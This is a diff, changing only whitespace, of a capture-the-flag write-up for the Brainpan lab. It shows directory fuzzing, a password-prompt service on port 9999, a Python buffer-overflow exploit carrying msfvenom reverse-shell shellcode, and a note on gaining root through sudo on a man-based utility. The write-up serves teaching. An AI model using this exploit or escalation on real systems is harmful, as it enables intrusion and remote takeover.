@@ -2,10 +2,10 @@
 ---
 
 
-| PORT  | SERVICE |
+| PORT | SERVICE |
 | :---- | :------ |
-| 9999  | ABYSS?  |
-| 10000 | HTTP    |
+| 9999 | ABYSS? |
+| 10000 | HTTP |
 
 
 
@@ -19,27 +19,27 @@ Since we got a website, we can fuzz at first, this is a `Buffer Overflow` room, 
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.87.171:10000/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.87.171:10000/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.87.171:10000/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-bin                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 182ms]
+bin [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 182ms]
 ```
 
 Inside of `/bin` we can find this:
@@ -51,19 +51,19 @@ We got the `brainpan.exe` file, this is the same file running on port `9999`, we
 
 ```
 nc 10.10.87.171 9999
-_|                            _|
-_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
-_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
-_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
-                                            _|
-                                            _|
+_| _|
+_|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
+_| _| _|_| _| _| _| _| _| _| _| _| _| _| _|
+_| _| _| _| _| _| _| _| _| _| _| _| _| _|
+_|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
+ _|
+ _|
 
 [________________________ WELCOME TO BRAINPAN _________________________]
-                          ENTER THE PASSWORD
+ ENTER THE PASSWORD
 
-                          >> test
-                          ACCESS DENIED
+ >> test
+ ACCESS DENIED
 ```
 
 
@@ -206,23 +206,23 @@ from time import sleep
 # msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 
 payload = (
-    b"\xba\x4c\x84\x2a\x2a\xdb\xde\xd9\x74\x24\xf4\x5e\x2b\xc9"
-    b"\xb1\x12\x83\xee\xfc\x31\x56\x0e\x03\x1a\x8a\xc8\xdf\x93"
-    b"\x49\xfb\xc3\x80\x2e\x57\x6e\x24\x38\xb6\xde\x4e\xf7\xb9"
-    b"\x8c\xd7\xb7\x85\x7f\x67\xfe\x80\x86\x0f\x0b\x7d\x6c\xd3"
-    b"\x63\x83\x8e\xfa\x2f\x0a\x6f\x4c\xa9\x5c\x21\xff\x85\x5e"
-    b"\x48\x1e\x24\xe0\x18\x88\xd9\xce\xef\x20\x4e\x3e\x3f\xd2"
-    b"\xe7\xc9\xdc\x40\xab\x40\xc3\xd4\x40\x9e\x84"
+ b"\xba\x4c\x84\x2a\x2a\xdb\xde\xd9\x74\x24\xf4\x5e\x2b\xc9"
+ b"\xb1\x12\x83\xee\xfc\x31\x56\x0e\x03\x1a\x8a\xc8\xdf\x93"
+ b"\x49\xfb\xc3\x80\x2e\x57\x6e\x24\x38\xb6\xde\x4e\xf7\xb9"
+ b"\x8c\xd7\xb7\x85\x7f\x67\xfe\x80\x86\x0f\x0b\x7d\x6c\xd3"
+ b"\x63\x83\x8e\xfa\x2f\x0a\x6f\x4c\xa9\x5c\x21\xff\x85\x5e"
+ b"\x48\x1e\x24\xe0\x18\x88\xd9\xce\xef\x20\x4e\x3e\x3f\xd2"
+ b"\xe7\xc9\xdc\x40\xab\x40\xc3\xd4\x40\x9e\x84"
 )
 
 # â”€â”€â”€ 2. BUILD THE BUFFER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 #
-#   [524 "A" bytes] + [4-byte JMP ESP address] + [NOP sled] + [payload]
+# [524 "A" bytes] + [4-byte JMP ESP address] + [NOP sled] + [payload]
 #
-padding  = b"A" * 524
+padding = b"A" * 524
 
 # This 4-byte JMP ESP (little-endian) from mona. Change if yours differs.
-eip      = b"\xF3\x12\x17\x31"   # JMP ESP â†’ 0x311712f3
+eip = b"\xF3\x12\x17\x31" # JMP ESP â†’ 0x311712f3
 
 # NOP sled to give the shellcode some landing space
 nop_sled = b"\x90" * 32
@@ -230,22 +230,22 @@ nop_sled = b"\x90" * 32
 buffer = padding + eip + nop_sled + payload
 
 # â”€â”€â”€ 3. SET UP TARGET CONNECTION â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-host = "10.10.87.171"   # â† change to your Brainpan IP if different
+host = "10.10.87.171" # â† change to your Brainpan IP if different
 port = 9999
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
-    s.connect((host, port))
+ s.connect((host, port))
 except Exception as e:
-    print(f"[-] Could not connect to {host}:{port} -> {e}")
-    sys.exit(1)
+ print(f"[-] Could not connect to {host}:{port} -> {e}")
+ sys.exit(1)
 
 # Optional: read any initial banner or prompt
 try:
-    banner = s.recv(1024)
-    print(banner.decode(errors="ignore"))
+ banner = s.recv(1024)
+ print(banner.decode(errors="ignore"))
 except:
-    pass
+ pass
 
 # â”€â”€â”€ 4. SEND THE EXPLOIT (PASSWORD) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 #
@@ -293,9 +293,9 @@ We can see we got a binary named `anansi_util` on here that we can run as sudo w
 puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
 Usage: /home/anansi/bin/anansi_util [action]
 Where [action] is one of:
-  - network
-  - proclist
-  - manual [command]
+ - network
+ - proclist
+ - manual [command]
 ```
 
 The PE vector on this binary is the use of `manual` command, the man command on Linux is used to display the user manual of any command we run on the terminal, the issue on this, is that we can exploit it to get a root as shell, let's refer to `GTFOBINS` to check the PE:
